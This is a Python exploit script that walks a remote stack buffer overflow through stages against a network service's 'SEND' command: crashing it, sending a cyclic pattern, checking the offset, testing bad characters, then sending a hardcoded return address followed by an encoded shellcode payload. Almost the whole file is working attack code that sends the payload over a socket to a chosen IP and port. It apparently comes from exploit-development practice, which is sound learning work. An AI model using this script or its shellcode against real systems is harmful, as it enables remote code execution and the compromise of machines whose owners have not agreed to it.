#!/usr/bin/python3
#note for python3
#important : "\x90" with throw unicodeerror in python3, 
#            hide NOP SLED in shellcode.
#Warning: s.send(bstr.encode()) <==== bad idea since conversion creates issues
#Alternative = b'string ' + '\xd1\x90\xd5' etc
#MORAL: python2 is better for exploit development and lesson lernt

#Crash, send pattern, verify eip, identify and exploit are abstracted to have cli flags
#only badchars, shellcode and retadd are hardcoded. 
#while exploiting -s flag value is only used for parser check, since retadd is hardcoded.
#or a regexp like /(\\x([0-9a-fA-F]{2})){4}/ could be used for -s flag address.

#Just in case, typical usage
#python script.py -r 192.168.0.6 -P 10000 --crash
#python script.py -r 192.168.0.6 -P 10000 --patt
#python script.py -d KfFa 
#python script.py -r 192.168.0.6 -P 10000 --verify -p 500 -s YYYY 
#python script.py -r 192.168.0.6 -P 10000 --identify -p 500 -s YYYY 
#python script.py -r 192.168.0.6 -P 10000 --exploit -p 500 -s BBBB 

import sys, socket, string
from argparse import ArgumentParser
from itertools import product

def printexit(val):
    print(val)
    sys.exit("exiting : %s" %(val))

def searchb(buff,pat):
    print("%s is found at offset %i \n" %(pat,len(buff.split(pat)[0])))
    sys.exit(0)

parser = ArgumentParser()
parser.add_argument("-r",default="192.168.0.5",help="remote server ip address")
parser.add_argument("-P",type=int,default=5555,help="remote server port")
parser.add_argument("-l",type=int,default=5000, help="Total length for buffer String")
parser.add_argument("-p",type=int,default=0, help="position of offset")
parser.add_argument("-s",help="offset string")
parser.add_argument("-d",help="search bytes")
parser.add_argument("--crash",help="Crash the application",action="store_true")
parser.add_argument("--patt",help="Send the unique pattern",action="store_true")
parser.add_argument("--verify",help="verify the offset by special offset value",action="store_true")
parser.add_argument("--identify",help="Identify characters that could not be included in payload",action="store_true")
parser.add_argument("--exploit",help="run the exploit",action="store_true")

pargs=parser.parse_args()

(pargs.p > pargs.l or pargs.p < 0) and sys.exit("Offset position cannot be negative or exceed total length")
(pargs.p !=0 and not isinstance(pargs.s,str)) and sys.exit("Offset string should be provided with position")
(pargs.p !=0 and len(pargs.s) != 4) and sys.exit("Offset string should be 4 Bytes")
(pargs.verify and pargs.p == 0) and sys.exit("Offset position/String not set")
(pargs.identify and pargs.p ==0) and sys.exit("Offset position/String not set")

#END OF CLI ARGUMENTS

server0 = pargs.r
port0= pargs.P
bstr = ""

#retadd : hardcoded, change accordingly
retadd = "\x71\x1d\xd1\x65"

#badchars : hardcoded change accordingly
badchars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

#shellcode : hardcoded change accordingly
shellcode=(
"\x3f\x3f\x42\x49\xfd\x40\x9b\x90\x42\x91\xf9\x9f\x4a\xfc\x40"
"\x4b\xba\xaf\xac\xe6\x8d\xdb\xc1\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x41\x50\x04\x78\x61\x41"
"\x4b\x83\x99\x92\x2c\x0d\x7c\xa3\x6c\x69\xf5\x94\x5c\xf9\x5b"
"\x19\x16\xaf\x4f\xaa\x5a\x78\x60\x1b\xd0\x5e\x4f\x9c\x49\xa2"
"\xce\x1e\x90\xf7\x30\x1e\x5b\x0a\x31\x67\x86\xe7\x63\x30\xcc"
"\x5a\x93\x35\x98\x66\x18\x05\x0c\xef\xfd\xde\x2f\xde\x50\x54"
"\x76\xc0\x53\xb9\x02\x49\x4b\xde\x2f\x03\xe0\x14\xdb\x92\x20"
"\x65\x24\x38\x0d\x49\xd7\x40\x4a\x6e\x08\x37\xa2\x8c\xb5\x40"
"\x71\xee\x61\xc4\x61\x48\xe1\x7e\x4d\x68\x26\x18\x06\x66\x83"
"\x6e\x40\x6b\x12\xa2\xfb\x97\x9f\x45\x2b\x1e\xdb\x61\xef\x7a"
"\xbf\x08\xb6\x26\x6e\x34\xa8\x88\xcf\x90\xa3\x25\x1b\xa9\xee"
"\x21\xe8\x80\x10\xb2\x66\x92\x63\x80\x29\x08\xeb\xa8\xa2\x96"
"\xec\xcf\x98\x6f\x62\x2e\x23\x90\xab\xf5\x77\xc0\xc3\xdc\xf7"
"\x8b\x13\xe0\x2d\x1b\x43\x4e\x9e\xdc\x33\x2e\x4e\xb5\x59\xa1"
"\xb1\xa5\x62\x6b\xda\x4c\x99\xfc\xef\x9b\xa1\x0a\x87\x99\xa1"
"\xe3\x04\x17\x47\x69\xa5\x71\xd0\x06\x5c\xd8\xaa\xb7\xa1\xf6"
"\xd7\xf8\x2a\xf5\x28\xb6\xda\x70\x3a\x2f\x2b\xcf\x60\xe6\x34"
"\xe5\x0c\x64\xa6\x62\xcc\xe3\xdb\x3c\x9b\xa4\x2a\x35\x49\x59"
"\x14\xef\x6f\xa0\xc0\xc8\x2b\x7f\x31\xd6\xb2\xf2\x0d\xfc\xa4"
"\xca\x8e\xb8\x90\x82\xd8\x16\x4e\x65\xb3\xd8\x38\x3f\x68\xb3"
"\xac\xc6\x42\x04\xaa\xc6\x8e\xf2\x52\x76\x67\x43\x6d\xb7\xef"
"\x43\x16\xa5\x8f\xac\xcd\x6d\xaf\x4e\xc7\x9b\x58\xd7\x82\x21"
"\x05\xe8\x79\x65\x30\x6b\x8b\x16\xc7\x73\xfe\x13\x83\x33\x13"
"\x6e\x9c\xd1\x13\xdd\x9d\xf3")


g1=product(string.ascii_letters + string.digits,repeat=4)
g2=product(string.ascii_uppercase,string.ascii_lowercase,string.digits,repeat=1)
while len(bstr) <= pargs.l:
    bstr = bstr + "".join(next(g2))

if (pargs.p != 0):
    bstr = bstr[:pargs.p] + pargs.s + bstr[-1*(pargs.l -pargs.p):]

print("Generated Pattern: %s" % (bstr))
pargs.d and searchb(bstr,pargs.d)

print("Fuzzing Begins : \n")

#bstr = "SEND " + "\x41"*2500 + "\x42"*4 + "\x43"*500   # <===== just for clarity
#bstr = "SEND " + "\x41"*2500 + "\x42"*4 + badchars
#bstr = "SEND " + "\x41"*2500 + "\x71\x1d\xd1\x65" + shellcode

if pargs.crash:
    print("Stage 1 : crashing the remote server \n")
    bstr = "SEND " + "\x41"*pargs.l
    #printexit(bstr) 

if pargs.patt:
    print("Stage 2 : Unique pattern is sent \n")
    bstr = "SEND " + bstr
    #printexit(bstr)

if pargs.verify:
    print("Stage 3 : Verifing the location address \n")
    bstr = "SEND " + "\x41"*pargs.p + pargs.s + "\x43"*500
    #printexit(bstr)

if pargs.identify:
    print("Stage 4 : Identifying forbidden characters for payload \n")
    bstr = "SEND " + "\x41"*pargs.p + retadd + badchars
    #printexit(bstr)

if pargs.exploit:
    print("Stage 5 : Run the exploit \n")
    bstr = "SEND " + "\x41"*pargs.p + retadd + shellcode # retval can change
    #printexit(bstr)

#bstr = "SEND " + "\x41"*2500 + "\x42"*4 + "\x43"*600  # <==== just in case of a quick and dirty check
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect_ex((server0,port0))
connect and printexit("Unable to connect to port " + port0 + " in " + server0)
banner=s.recv(1024)
s.send(bstr)
rslt=s.recv(1024)
print(rslt)
s.close()
print("Ending ")
sys.exit(0)
